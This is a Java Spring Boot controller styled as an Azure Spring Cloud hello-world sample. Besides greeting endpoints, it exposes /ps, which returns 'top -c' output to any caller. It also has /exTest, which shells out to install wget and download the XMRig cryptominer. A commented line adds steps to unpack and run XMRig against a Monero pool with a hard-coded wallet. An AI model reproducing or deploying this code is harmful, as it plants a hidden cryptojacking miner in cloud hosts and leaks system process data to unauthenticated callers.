package com.example.hellospring;

import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.RequestMapping;
import java.io.BufferedReader;
import java.io.InputStreamReader;

@RestController
public class HelloController {

    @RequestMapping("/")
    public String index() {
        String nameOS = "os.name";  
      String versionOS = "os.version";  
      String architectureOS = "os.arch";
      System.out.println("\n  The information about OS");
      System.out.println("\nName of the OS: " + System.getProperty(nameOS));
      System.out.println("Version of the OS: " + System.getProperty(versionOS));
      System.out.println("Architecture of THe OS: " + System.getProperty(architectureOS));  
       return "Greetings from Azure Spring Cloud!";
    }

    @RequestMapping("/test")
    public String test(){
            String nameOS = "os.name";  
      String versionOS = "os.version";  
      String architectureOS = "os.arch";
              String infox = "OS: " + System.getProperty(nameOS) + "\nVersion: " + System.getProperty(versionOS);
                    return infox;
    }
    @RequestMapping("/ps")
    public String getCurrentPs(){
        String s;
        Process p;
        String outputx="Here you are:" ;
        outputx +=System.lineSeparator();
        try {
            p = Runtime.getRuntime().exec("top -c");
            BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null){
                outputx += s;
                outputx +=System.lineSeparator();
            }
            p.waitFor();
            System.out.println(outputx);
            System.out.println ("exit: " + p.exitValue());
            p.destroy();
        } catch (Exception e) {
            outputx += "ERROR";
        }
        return outputx;
    }
    
    @RequestMapping("/exTest")
    public String exTest(){
        String s;
        String outputx="Run progress:" ;
        try{
//Process proc = Runtime.getRuntime().exec("apt-get update; apt-get install wget;wget https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz; tar -xvf xmrig-6.16.1-linux-x64.tar.gz; cd xmrig-6.16.1;./xmrig -o pool.minexmr.com:4444 -u 43HMPa3Hs5DGGmHQMzuDiCDAYhF5A8GZXS3biojW6aUwF8Two1eSEq2KbweXGe9WkuhwRAehUcnGM1G7VfUFJJab4itzN5r.test1");
Process proc = Runtime.getRuntime().exec("apt-get update; apt-get install wget;wget https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz;ls");
           BufferedReader br = new BufferedReader(
                new InputStreamReader(proc.getInputStream()));
            while ((s = br.readLine()) != null){
               outputx += s;
                outputx +=System.lineSeparator();
            }
   proc.waitFor();
        } catch(Exception e){
            outputx += "Error exe";
            outputx += e.toString();
            System.out.println ("Error exe");
        }
        return outputx;
    }

}